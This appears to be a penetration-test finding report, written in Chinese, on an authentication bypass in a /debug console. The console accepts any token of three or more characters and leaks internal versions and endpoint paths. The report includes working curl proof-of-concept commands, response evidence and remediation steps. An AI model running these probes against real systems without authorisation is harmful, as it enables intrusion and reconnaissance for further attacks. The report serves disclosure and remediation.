# 调试控制台 /debug 的 token 校验可被任意短字符串绕过

**ID:** vuln-0005
**Severity:** MEDIUM
**Found:** 2026-10-31 07:33:52 UTC
**Target:** http://10.0.93.73:18080/
**Endpoint:** /debug
**Method:** GET
**CWE:** CWE-287
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Low

## Description

`/debug` 调试控制台要求通过 `token` 查询参数提供轮换令牌，但校验逻辑存在缺陷：只要 `token` 值长度达到 3 个字符即视为通过，任意随机字符串都可获得访问权限。攻击者无需知道真实令牌即可读取内部调试信息。

## Evidence

阈值特征：

```
token=t        -> HTTP 401
token=te       -> HTTP 401
token=tes      -> HTTP 200  (Debug Info)
token=test     -> HTTP 200
token=testing  -> HTTP 200
token=test123  -> HTTP 200
token=deploy   -> HTTP 200
token=admin    -> HTTP 200
token=prod     -> HTTP 200
token=wrongvalue -> HTTP 500
```

绕过后的响应内容：

```html
<h1>🔧 Debug Info (INTERNAL ONLY)</h1>
<pre>
Server: Ubuntu 22.04 LTS / nginx/1.24.0
App: Nexus-DevOps v3.2.1 (Spring Boot 2.7.18)
Gateway: nexus-gateway/2.4.1 (mgmt: /api/status, files: /api/files?path=)
Actuator: /actuator/env (internal monitoring)
Monitoring: /metrics (Prometheus) | API docs: /
</pre>
```

## Impact

未认证攻击者通过一次请求即可获得内部调试控制台内容，包括操作系统与中间件版本、应用与网关内部路径、内部监控与 Actuator 端点位置等。这些信息直接为后续攻击提供路线图（例如指向 `/api/files?path=` 与 `/actuator/env`）。该校验还暴露出非健壮的输入处理——部分取值触发 500 错误，说明令牌存在被解析的环节，可作为进一步探测的入口。

## Counterevidence

必须排除"这其实是某个真实令牌恰好匹配"的可能：`tes`（3 字符）与 `admin`、`prod`、`rotation` 这些语义完全无关的取值全部通过，而 `te`（2 字符）被拒绝，且 `wrongvalue` 返回 500 而非 401 —— 这一组合只有"按长度判断"才能解释，无法用单一正确令牌解释。同时确认无 token 与空 token 均为 401，排除"参数存在即放行"。限制在于该端点仅泄露版本与路径信息，本身不提供数据修改或代码执行能力，故评为 Medium 而非更高。

## What Would Change This Severity

若在调试控制台中进一步发现可执行操作（如命令执行、日志导出、配置热更新），或 `token` 的 500 分支可被利用做注入，则应上调至 High。

## Technical Analysis

未带 `token` 时返回 401，并提示"legacy deploy hooks pass the rotation token as query param"：

```http
GET /debug HTTP/1.1

HTTP/1.1 401 Unauthorized
<p>Debug console restricted to on-call engineers.</p>
<p>Legacy deploy hooks pass the rotation token as query param: <code>GET /debug?token=&lt;deploy-token&gt;</code></p>
```

系统性探测 `token` 取值后得到清晰的长度阈值特征：

| token 取值 | 长度 | 结果 |
|---|---|---|
| 无参数 | - | 401 |
| 空值 | 0 | 401 |
| `t` | 1 | 401 |
| `te` | 2 | 401 |
| `tes` | 3 | **200 调试信息** |
| `test` | 4 | 200 |
| `testing` / `test123` | 7-8 | 200 |
| `deploy` / `deploy-token` / `rotation` / `rotate` / `admin` / `prod` | 4-12 | 200 |
| `wrongvalue` | 10 | 500 |

阈值恰好落在长度 3，说明校验实现为长度判断（如 `token.length >= 3`）或错误的 `indexOf`/截断比较，而不是与真实令牌做常量时间比较。`wrongvalue` 返回 500 而非 401，进一步说明存在未处理的解析分支（可能涉及 base64/JWT 解码），可作为差异探测的侧信道。

通过绕过返回的调试信息包含：

```
Server: Ubuntu 22.04 LTS / nginx/1.24.0
App: Nexus-DevOps v3.2.1 (Spring Boot 2.7.18)
Gateway: nexus-gateway/2.4.1 (mgmt: /api/status, files: /api/files?path=)
Actuator: /actuator/env (internal monitoring)
Monitoring: /metrics (Prometheus) | API docs: /
```

## Proof of Concept

1. 不带任何 token 请求 `/debug`，确认返回 401 并提示需要 deploy-token。
2. 依次以长度 1、2、3 的字符串作为 `token` 值请求，观察状态码变化。
3. 确认长度为 3 的 `tes` 即返回 200，而长度为 2 的 `te` 返回 401，定位校验阈值为长度。
4. 以 `admin`、`prod` 等与实际令牌无关的词验证通过，确认无需知晓真实令牌。
5. 读取响应中的内部技术栈与端点路径作为后续利用的输入。
6. 以 `wrongvalue` 触发 500 作为差异对照。

```bash
# 基线：无 token
curl -sS -o /dev/null -w "%{http_code}\n" "http://10.0.93.73:18080/debug"

# 阈值探测
for t in t te tes test; do
  code=$(curl -sS -o /dev/null -w "%{http_code}" "http://10.0.93.73:18080/debug?token=$t")
  echo "token=$t -> $code"
done

# 任意无关字符串均可通过
curl -sS "http://10.0.93.73:18080/debug?token=admin"
curl -sS "http://10.0.93.73:18080/debug?token=prod"
```

## Remediation

1. 将令牌比较改为常量时间比较（`MessageDigest.isEqual`），并与服务端保存的真实令牌做完整匹配，禁止任何基于长度或前缀的判断。
2. 彻底移除"通过查询参数传递令牌"的遗留机制；调试接口应要求强认证（管理员会话 + MFA）并仅在内网管理端口暴露。
3. 生产构建中禁用调试控制台，或将其置于 VPN / 跳板机之后的独立管理网络。
4. 统一所有鉴权失败路径的响应（状态码与响应体一致），消除 401/500 差异侧信道。
5. 将调试接口的访问行为纳入审计日志与告警。

## Assumptions

攻击者仅需能访问 `10.0.93.73:18080`，并通过响应中自述的提示得知 `token` 参数的存在。该端点无需会话或任何前置认证。
